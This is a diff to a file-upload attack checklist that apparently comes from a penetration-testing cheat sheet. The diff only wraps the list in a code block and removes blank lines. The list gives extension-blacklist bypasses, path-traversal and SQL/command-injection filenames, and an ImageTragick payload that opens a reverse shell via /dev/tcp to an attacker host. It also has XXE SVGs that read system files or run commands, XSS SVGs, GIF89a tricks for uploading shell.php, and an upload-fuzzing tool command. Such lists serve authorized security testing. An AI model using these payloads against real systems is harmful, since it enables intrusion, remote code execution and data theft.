@@ -1,3 +1,6 @@
+# File upload
+
+```text
 # File name validation
     # extension blacklisted:
     PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
@@ -38,35 +41,28 @@ html, js: html injection, xss, open redirect
 png, jpeg: pixel flood attack dos
 zip: rce via lfi, dos
 pdf, pptx: ssrf, blind xxe
-
 # Path traversal
 ../../etc/passwd/logo.png
 ../../../logo.png
-
 # SQLi
 'sleep(10).jpg
 sleep(10)-- -.jpg
-
 # Command injection
 ; sleep 10;
-
 # ImageTragick
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
 pop graphic-context
-
 # XXE .svg
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
 <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
 <text font-size="40" x="0" y="16">&xxe;</text>
 </svg>
-
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
 <image xlink:href="expect://ls"></image>
 </svg>
-
 # XSS svg
 <svg onload=alert(document.comain)>.svg
 <?xml version="1.0" standalone="no"?>
@@ -78,7 +74,6 @@ File Upload Checklist 3
 alert("HolyBugx XSS");
 </script>
 </svg>
-
 # Open redirect svg
 <code>
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
@@ -99,7 +94,6 @@ xmlns="http://www.w3.org/2000/svg">
 # (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
 # If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
 # upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.
-
 # Advance Bypassing techniques
 # Imagetragick aka ImageMagick:
 https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
@@ -108,3 +102,4 @@ https://github.com/neex/gifoeb
 # Upload file tool
 https://github.com/almandin/fuxploider
 python3 fuxploider.py --url https://example.com --not-regex "wrong file type"
+```
